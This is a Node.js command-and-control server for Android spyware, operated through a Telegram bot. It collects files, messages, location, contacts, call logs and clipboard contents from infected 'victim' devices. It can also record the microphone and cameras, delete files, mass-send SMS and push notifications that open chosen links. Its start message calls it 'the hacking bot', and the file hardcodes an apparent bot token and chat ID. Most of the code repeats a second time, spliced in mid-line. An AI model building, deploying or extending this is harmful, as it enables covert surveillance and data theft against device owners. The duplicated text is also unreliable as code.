const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// Use environment variables for security
const token = process.env.TELEGRAM_BOT_TOKEN || '8458876632:AAFYa27fG7rnAiH6BBSKOkmpviWcQbmFSO4';
const id = process.env.TELEGRAM_CHAT_ID || '6576599231';
const address = process.env.HEALTH_CHECK_URL || 'https://www.youtube.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ 
    server: appServer,
    perMessageDeflate: false
});

// Initialize bot with error handling
let appBot;
try {
    appBot = new telegramBot(token, { 
        polling: {
            interval: 300,
            autoStart: true,
            params: {
                timeout: 10
            }
        }
    });
    console.log('Telegram Bot initialized successfully');
} catch (error) {
    console.error('Failed to initialize Telegram Bot:', error);
    process.exit(1);
}

const appClients = new Map();
const upload = multer();
app.use(bodyParser.json());

// Add request logging
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
});

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">🚀 Server Running Successfully</h1><p align="center">Telegram Bot is active and ready!</p>');
});

// Health check endpoint for Render
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        connectedClients: appClients.size
    });
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• Message from <b>${req.headers.model}</b> device`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        }).catch(error => {
            console.error('Error sending file:', error);
        });
    res.send('OK');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• Message from <b>${req.headers.model}</b> device\n\n` + req.body['text'], {parse_mode: "HTML"})
        .catch(error => {
            console.error('Error sending text:', error);
        });
    res.send('OK');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
        .then(() => {
            return appBot.sendMessage(id, `°• Location from <b>${req.headers.model}</b> device`, {parse_mode: "HTML"});
        })
        .catch(error => {
            console.error('Error sending location:', error);
        });
    res.send('OK');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });
    
    console.log(`New device connected: ${model} (${uuid})`);
    
    appBot.sendMessage(id,
        `°• New device connected\n\n` +
        `• Device model : <b>${model}</b>\n` +
        `• Battery : <b>${battery}</b>\n` +
        `• Android version : <b>${version}</b>\n` +
        `• Screen brightness : <b>${brightness}</b>\n` +
        `• Provider : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    ).catch(error => {
        console.error('Error sending connection message:', error);
    });

    ws.on('close', function () {
        console.log(`Device disconnected: ${model} (${uuid})`);
        appBot.sendMessage(id,
            `°• Device disconnected\n\n` +
            `• Device model : <b>${model}</b>\n` +
            `• Battery : <b>${battery}</b>\n` +
            `• Android version : <b>${version}</b>\n` +
            `• Screen brightness : <b>${brightness}</b>\n` +
            `• Provider : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        ).catch(error => {
            console.error('Error sending disconnection message:', error);
        });
        appClients.delete(ws.uuid);
    });

    ws.on('error', function (error) {
        console.error(`WebSocket error for device ${model}:`, error);
    });
});

// Bot message handling with improved error handling
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    // Only process messages from authorized chat ID
    if (chatId.toString() !== id.toString()) {
        console.log(`Unauthorized access attempt from chat ID: ${chatId}`);
        return;
    }

    if (message.reply_to_message) {
        handleReplyMessage(message);
    } else {
        handleDirectMessage(message);
    }
});

function handleReplyMessage(message) {
    const replyText = message.reply_to_message.text;
    
    if (replyText.includes('°• Please reply the number to which you want to send the SMS')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            '°• Great, now enter the message you want to send to this number\n\n' +
            '• Be careful that the message will not be sent if the number of characters in your message is more than allowed',
            {reply_markup: {force_reply: true}}
        ).catch(console.error);
    }
    else if (replyText.includes('°• Great, now enter the message you want to send to this number')) {
        sendToWebSocketClient(`send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the message you want to send to all contacts')) {
        sendToWebSocketClient(`send_message_to_all:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the path of the file you want to download')) {
        sendToWebSocketClient(`file:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the path of the file you want to delete')) {
        sendToWebSocketClient(`delete_file:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter how long you want the microphone to be recorded')) {
        sendToWebSocketClient(`microphone:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter how long you want the main camera to be recorded')) {
        sendToWebSocketClient(`rec_camera_main:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter how long you want the selfie camera to be recorded')) {
        sendToWebSocketClient(`rec_camera_selfie:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the message that you want to appear on the target device')) {
        sendToWebSocketClient(`toast:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the message you want to appear as notification')) {
        currentTitle = message.text;
        appBot.sendMessage(id,
            '°• Great, now enter the link you want to be opened by the notification\n\n' +
            '• When the victim clicks on the notification, the link you are entering will be opened',
            {reply_markup: {force_reply: true}}
        ).catch(console.error);
    }
    else if (replyText.includes('°• Great, now enter the link you want to be opened by the notification')) {
        sendToWebSocketClient(`show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the audio link you want to play')) {
        sendToWebSocketClient(`play_audio:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
}

function handleDirectMessage(message) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '°• Hello, my Dear @Techno_Beats\n\n' +
            '• Hey there! I am the hacking bot. I am a bot that can help you with all your hacking needs.\n\n' +
            '• I can help you find victim information on this hacking bot.\n\n' +
            '• I can also help you to gather victim information, such as victim device all access in this bot.\n\n' +
            '• This bot was made by @Techno_Beats JOIN TELEGRAM',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute command"]],
                    'resize_keyboard': true
                }
            }
        ).catch(console.error);
    }
    else if (message.text === 'Connected devices') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• No connecting devices available\n\n' +
                '• Make sure the application is installed on the target device'
            ).catch(console.error);
        } else {
            let text = '°• List of connected devices :\n\n';
            appClients.forEach(function (value, key) {
                text += `• Device model : <b>${value.model}</b>\n` +
                    `• Battery : <b>${value.battery}</b>\n` +
                    `• Android version : <b>${value.version}</b>\n` +
                    `• Screen brightness : <b>${value.brightness}</b>\n` +
                    `• Provider : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, {parse_mode: "HTML"}).catch(console.error);
        }
    }
    else if (message.text === 'Execute command') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• No connecting devices available\n\n' +
                '• Make sure the application is installed on the target device'
            ).catch(console.error);
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(id, '°• Select device to execute command', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            }).catch(console.error);
        }
    }
}

function sendToWebSocketClient(message) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === 1 && ws.uuid === currentUuid) {
            ws.send(message);
        }
    });
}

function sendSuccessMessage() {
    appBot.sendMessage(id,
        '°• Your request is on process\n\n' +
        '• You will receive a response in the next few moments',
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["Connected devices"], ["Execute command"]],
                'resize_keyboard': true
            }
        }
    ).catch(console.error);
}

// Callback query handling
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    
    console.log(`Callback received: ${command} for UUID: ${uuid}`);
    
    if (command === 'device') {
        const deviceInfo = appClients.get(uuid);
        if (deviceInfo) {
            appBot.editMessageText(`°• Select command for device : <b>${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {text: 'Apps', callback_data: `apps:${uuid}`},
                            {text: 'Device info', callback_data: `device_info:${uuid}`}
                        ],
                        [
                            {text: 'Get file', callback_data: `file:${uuid}`},
                            {text: 'Delete file', callback_data: `delete_file:${uuid}`}
                        ],
                        [
                            {text: 'Clipboard', callback_data: `clipboard:${uuid}`},
                            {text: 'Microphone', callback_data: `microphone:${uuid}`},
                        ],
                        [
                            {text: 'Main camera', callback_data: `camera_main:${uuid}`},
                            {text: 'Selfie camera', callback_data: `camera_selfie:${uuid}`}
                        ],
                        [
                            {text: 'Location', callback_data: `location:${uuid}`},
                            {text: 'Toast', callback_data: `toast:${uuid}`}
                        ],
                        [
                            {text: 'Calls', callback_data: `calls:${uuid}`},
                            {text: 'Contacts', callback_data: `contacts:${uuid}`}
                        ],
                        [
                            {text: 'Vibrate', callback_data: `vibrate:${uuid}`},
                            {text: 'Show notification', callback_data: `show_notification:${uuid}`}
                        ],
                        [
                            {text: 'Messages', callback_data: `messages:${uuid}`},
                            {text: 'Send message', callback_data: `send_message:${uuid}`}
                        ],
                        [
                            {text: 'Play audio', callback_data: `play_audio:${uuid}`},
                            {text: 'Stop audio', callback_data: `stop_audio:${uuid}`},
                        ],
                        [
                            {
                                text: 'Send message to all contacts',
                                callback_data: `send_message_to_all:${uuid}`
                            }
                        ],
                    ]
                },
                parse_mode: "HTML"
            }).catch(console.error);
        }
    } else {
        handleCommandCallback(command, uuid, msg);
    }
});

function handleCommandCallback(command, uuid, msg) {
    const commandHandlers = {
        'calls': 'calls',
        'contacts': 'contacts',
        'messages': 'messages',
        'apps': 'apps',
        'device_info': 'device_info',
        'clipboard': 'clipboard',
        'camera_main': 'camera_main',
        'camera_selfie': 'camera_selfie',
        'location': 'location',
        'vibrate': 'vibrate',
        'stop_audio': 'stop_audio'
    };

    if (commandHandlers[command]) {
        sendToSpecificWebSocketClient(uuid, commandHandlers[command]);
        appBot.deleteMessage(id, msg.message_id).catch(console.error);
        sendSuccessMessage();
    } else {
        handleSpecialCommands(command, uuid, msg);
    }
}

function handleSpecialCommands(command, uuid, msg) {
    currentUuid = uuid;
    
    const specialCommands = {
        'send_message': {
            message: '°• Please reply the number to which you want to send the SMS\n\n' +
                    '• If you want to send sms to local country numbers, you can enter the number with zero at the beginning, otherwise enter the number with the country code',
            options: {reply_markup: {force_reply: true}}
        },
        'send_message_to_all': {
            message: '°• Enter the message you want to send to all contacts\n\n' +
                    '• Be careful that the message will not be sent if the number of characters in your message is more than allowed',
            options: {reply_markup: {force_reply: true}}
        },
        'file': {
            message: '°• Enter the path of the file you want to download\n\n' +
                    '• You do not need to enter the full file path, just enter the main path. For example, enter <b>DCIM/Camera</b> to receive gallery files.',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'delete_file': {
            message: '°• Enter the path of the file you want to delete\n\n' +
                    '• You do not need to enter the full file path, just enter the main path. For example, enter <b>DCIM/Camera</b> to delete gallery files.',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'microphone': {
            message: '°• Enter how long you want the microphone to be recorded\n\n' +
                    '• Note that you must enter the time numerically in units of seconds',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'toast': {
            message: '°• Enter the message that you want to appear on the target device\n\n' +
                    '• Toast is a short message that appears on the device screen for a few seconds',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'show_notification': {
            message: '°• Enter the message you want to appear as notification\n\n' +
                    '• Your message will be appear in target device status bar like regular notification',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'play_audio': {
            message: '°• Enter the audio link you want to play\n\n' +
                    '• Note that you must enter the direct link of the desired sound, otherwise the sound will not be played',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        }
    };

    if (specialCommands[command]) {
        appBot.deleteMessage(id, msg.message_id).catch(console.error);
        appBot.sendMessage(id, specialCommands[command].message, specialCommands[command].options)
            .catch(console.error);
    }
}

function sendToSpecificWebSocketClient(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === 1 && ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

// Ping clients to keep connection alive
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === 1) {
            ws.send('ping');
        }
    });
}, 30000); // Reduced to 30 seconds

// Health check for the server
setInterval(function () {
    try {
        axios.get(address).then(() => {
            console.log('Health check passed');
        }).catch(() => {
            console.log('Health check failed but continuing');
        });
    } catch (e) {
        console.log('Health check error:', e.message);
    }
}, 60000); // 1 minute

// Error handling for bot
appBot.on('error', (error) => {
    console.error('Telegram Bot Error:', error);
});

appBot.on('polling_error', (error) => {
    console.error('Telegram Bot Polling Error:', error);
    
    // If it's a conflict error (409), it means another instance is running
    if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
        console.log('Another bot instance detected. This instance will continue running.');
    }
});

const PORT = process.env.PORT || 22222;
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server is running on port ${PORT}`);
    console.log(`📱 Telegram Bot is active`);
    console.log(`🔗 WebSocket server is ready for connections`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    appServer.close(() => {
        console.log('Process terminated');
        process.exit(0);
    });
});app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• Message from <b>${req.headers.model}</b> device`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        }).catch(error => {
            console.error('Error sending file:', error);
        });
    res.send('OK');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• Message from <b>${req.headers.model}</b> device\n\n` + req.body['text'], {parse_mode: "HTML"})
        .catch(error => {
            console.error('Error sending text:', error);
        });
    res.send('OK');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
        .then(() => {
            return appBot.sendMessage(id, `°• Location from <b>${req.headers.model}</b> device`, {parse_mode: "HTML"});
        })
        .catch(error => {
            console.error('Error sending location:', error);
        });
    res.send('OK');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });
    
    console.log(`New device connected: ${model} (${uuid})`);
    
    appBot.sendMessage(id,
        `°• New device connected\n\n` +
        `• Device model : <b>${model}</b>\n` +
        `• Battery : <b>${battery}</b>\n` +
        `• Android version : <b>${version}</b>\n` +
        `• Screen brightness : <b>${brightness}</b>\n` +
        `• Provider : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    ).catch(error => {
        console.error('Error sending connection message:', error);
    });

    ws.on('close', function () {
        console.log(`Device disconnected: ${model} (${uuid})`);
        appBot.sendMessage(id,
            `°• Device disconnected\n\n` +
            `• Device model : <b>${model}</b>\n` +
            `• Battery : <b>${battery}</b>\n` +
            `• Android version : <b>${version}</b>\n` +
            `• Screen brightness : <b>${brightness}</b>\n` +
            `• Provider : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        ).catch(error => {
            console.error('Error sending disconnection message:', error);
        });
        appClients.delete(ws.uuid);
    });

    ws.on('error', function (error) {
        console.error(`WebSocket error for device ${model}:`, error);
    });
});

// Bot message handling with improved error handling
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    // Only process messages from authorized chat ID
    if (chatId.toString() !== id.toString()) {
        console.log(`Unauthorized access attempt from chat ID: ${chatId}`);
        return;
    }

    if (message.reply_to_message) {
        handleReplyMessage(message);
    } else {
        handleDirectMessage(message);
    }
});

function handleReplyMessage(message) {
    const replyText = message.reply_to_message.text;
    
    if (replyText.includes('°• Please reply the number to which you want to send the SMS')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            '°• Great, now enter the message you want to send to this number\n\n' +
            '• Be careful that the message will not be sent if the number of characters in your message is more than allowed',
            {reply_markup: {force_reply: true}}
        ).catch(console.error);
    }
    else if (replyText.includes('°• Great, now enter the message you want to send to this number')) {
        sendToWebSocketClient(`send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the message you want to send to all contacts')) {
        sendToWebSocketClient(`send_message_to_all:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the path of the file you want to download')) {
        sendToWebSocketClient(`file:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the path of the file you want to delete')) {
        sendToWebSocketClient(`delete_file:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter how long you want the microphone to be recorded')) {
        sendToWebSocketClient(`microphone:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter how long you want the main camera to be recorded')) {
        sendToWebSocketClient(`rec_camera_main:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter how long you want the selfie camera to be recorded')) {
        sendToWebSocketClient(`rec_camera_selfie:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the message that you want to appear on the target device')) {
        sendToWebSocketClient(`toast:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the message you want to appear as notification')) {
        currentTitle = message.text;
        appBot.sendMessage(id,
            '°• Great, now enter the link you want to be opened by the notification\n\n' +
            '• When the victim clicks on the notification, the link you are entering will be opened',
            {reply_markup: {force_reply: true}}
        ).catch(console.error);
    }
    else if (replyText.includes('°• Great, now enter the link you want to be opened by the notification')) {
        sendToWebSocketClient(`show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
    else if (replyText.includes('°• Enter the audio link you want to play')) {
        sendToWebSocketClient(`play_audio:${message.text}`);
        currentUuid = '';
        sendSuccessMessage();
    }
}

function handleDirectMessage(message) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '°• Hello, my Dear @Techno_Beats\n\n' +
            '• Hey there! I am the hacking bot. I am a bot that can help you with all your hacking needs.\n\n' +
            '• I can help you find victim information on this hacking bot.\n\n' +
            '• I can also help you to gather victim information, such as victim device all access in this bot.\n\n' +
            '• This bot was made by @Techno_Beats JOIN TELEGRAM',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute command"]],
                    'resize_keyboard': true
                }
            }
        ).catch(console.error);
    }
    else if (message.text === 'Connected devices') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• No connecting devices available\n\n' +
                '• Make sure the application is installed on the target device'
            ).catch(console.error);
        } else {
            let text = '°• List of connected devices :\n\n';
            appClients.forEach(function (value, key) {
                text += `• Device model : <b>${value.model}</b>\n` +
                    `• Battery : <b>${value.battery}</b>\n` +
                    `• Android version : <b>${value.version}</b>\n` +
                    `• Screen brightness : <b>${value.brightness}</b>\n` +
                    `• Provider : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, {parse_mode: "HTML"}).catch(console.error);
        }
    }
    else if (message.text === 'Execute command') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• No connecting devices available\n\n' +
                '• Make sure the application is installed on the target device'
            ).catch(console.error);
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(id, '°• Select device to execute command', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            }).catch(console.error);
        }
    }
}

function sendToWebSocketClient(message) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === 1 && ws.uuid === currentUuid) {
            ws.send(message);
        }
    });
}

function sendSuccessMessage() {
    appBot.sendMessage(id,
        '°• Your request is on process\n\n' +
        '• You will receive a response in the next few moments',
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["Connected devices"], ["Execute command"]],
                'resize_keyboard': true
            }
        }
    ).catch(console.error);
}

// Callback query handling
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    
    console.log(`Callback received: ${command} for UUID: ${uuid}`);
    
    if (command === 'device') {
        const deviceInfo = appClients.get(uuid);
        if (deviceInfo) {
            appBot.editMessageText(`°• Select command for device : <b>${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {text: 'Apps', callback_data: `apps:${uuid}`},
                            {text: 'Device info', callback_data: `device_info:${uuid}`}
                        ],
                        [
                            {text: 'Get file', callback_data: `file:${uuid}`},
                            {text: 'Delete file', callback_data: `delete_file:${uuid}`}
                        ],
                        [
                            {text: 'Clipboard', callback_data: `clipboard:${uuid}`},
                            {text: 'Microphone', callback_data: `microphone:${uuid}`},
                        ],
                        [
                            {text: 'Main camera', callback_data: `camera_main:${uuid}`},
                            {text: 'Selfie camera', callback_data: `camera_selfie:${uuid}`}
                        ],
                        [
                            {text: 'Location', callback_data: `location:${uuid}`},
                            {text: 'Toast', callback_data: `toast:${uuid}`}
                        ],
                        [
                            {text: 'Calls', callback_data: `calls:${uuid}`},
                            {text: 'Contacts', callback_data: `contacts:${uuid}`}
                        ],
                        [
                            {text: 'Vibrate', callback_data: `vibrate:${uuid}`},
                            {text: 'Show notification', callback_data: `show_notification:${uuid}`}
                        ],
                        [
                            {text: 'Messages', callback_data: `messages:${uuid}`},
                            {text: 'Send message', callback_data: `send_message:${uuid}`}
                        ],
                        [
                            {text: 'Play audio', callback_data: `play_audio:${uuid}`},
                            {text: 'Stop audio', callback_data: `stop_audio:${uuid}`},
                        ],
                        [
                            {
                                text: 'Send message to all contacts',
                                callback_data: `send_message_to_all:${uuid}`
                            }
                        ],
                    ]
                },
                parse_mode: "HTML"
            }).catch(console.error);
        }
    } else {
        handleCommandCallback(command, uuid, msg);
    }
});

function handleCommandCallback(command, uuid, msg) {
    const commandHandlers = {
        'calls': 'calls',
        'contacts': 'contacts',
        'messages': 'messages',
        'apps': 'apps',
        'device_info': 'device_info',
        'clipboard': 'clipboard',
        'camera_main': 'camera_main',
        'camera_selfie': 'camera_selfie',
        'location': 'location',
        'vibrate': 'vibrate',
        'stop_audio': 'stop_audio'
    };

    if (commandHandlers[command]) {
        sendToSpecificWebSocketClient(uuid, commandHandlers[command]);
        appBot.deleteMessage(id, msg.message_id).catch(console.error);
        sendSuccessMessage();
    } else {
        handleSpecialCommands(command, uuid, msg);
    }
}

function handleSpecialCommands(command, uuid, msg) {
    currentUuid = uuid;
    
    const specialCommands = {
        'send_message': {
            message: '°• Please reply the number to which you want to send the SMS\n\n' +
                    '• If you want to send sms to local country numbers, you can enter the number with zero at the beginning, otherwise enter the number with the country code',
            options: {reply_markup: {force_reply: true}}
        },
        'send_message_to_all': {
            message: '°• Enter the message you want to send to all contacts\n\n' +
                    '• Be careful that the message will not be sent if the number of characters in your message is more than allowed',
            options: {reply_markup: {force_reply: true}}
        },
        'file': {
            message: '°• Enter the path of the file you want to download\n\n' +
                    '• You do not need to enter the full file path, just enter the main path. For example, enter <b>DCIM/Camera</b> to receive gallery files.',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'delete_file': {
            message: '°• Enter the path of the file you want to delete\n\n' +
                    '• You do not need to enter the full file path, just enter the main path. For example, enter <b>DCIM/Camera</b> to delete gallery files.',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'microphone': {
            message: '°• Enter how long you want the microphone to be recorded\n\n' +
                    '• Note that you must enter the time numerically in units of seconds',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'toast': {
            message: '°• Enter the message that you want to appear on the target device\n\n' +
                    '• Toast is a short message that appears on the device screen for a few seconds',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'show_notification': {
            message: '°• Enter the message you want to appear as notification\n\n' +
                    '• Your message will be appear in target device status bar like regular notification',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        },
        'play_audio': {
            message: '°• Enter the audio link you want to play\n\n' +
                    '• Note that you must enter the direct link of the desired sound, otherwise the sound will not be played',
            options: {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        }
    };

    if (specialCommands[command]) {
        appBot.deleteMessage(id, msg.message_id).catch(console.error);
        appBot.sendMessage(id, specialCommands[command].message, specialCommands[command].options)
            .catch(console.error);
    }
}

function sendToSpecificWebSocketClient(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === 1 && ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

// Ping clients to keep connection alive
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === 1) {
            ws.send('ping');
        }
    });
}, 30000); // Reduced to 30 seconds

// Health check for the server
setInterval(function () {
    try {
        axios.get(address).then(() => {
            console.log('Health check passed');
        }).catch(() => {
            console.log('Health check failed but continuing');
        });
    } catch (e) {
        console.log('Health check error:', e.message);
    }
}, 60000); // 1 minute

// Error handling for bot
appBot.on('error', (error) => {
    console.error('Telegram Bot Error:', error);
});

appBot.on('polling_error', (error) => {
    console.error('Telegram Bot Polling Error:', error);
    
    // If it's a conflict error (409), it means another instance is running
    if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
        console.log('Another bot instance detected. This instance will continue running.');
    }
});

const PORT = process.env.PORT || 22222;
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server is running on port ${PORT}`);
    console.log(`📱 Telegram Bot is active`);
    console.log(`🔗 WebSocket server is ready for connections`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    appServer.close(() => {
        console.log('Process terminated');
        process.exit(0);
    });
});
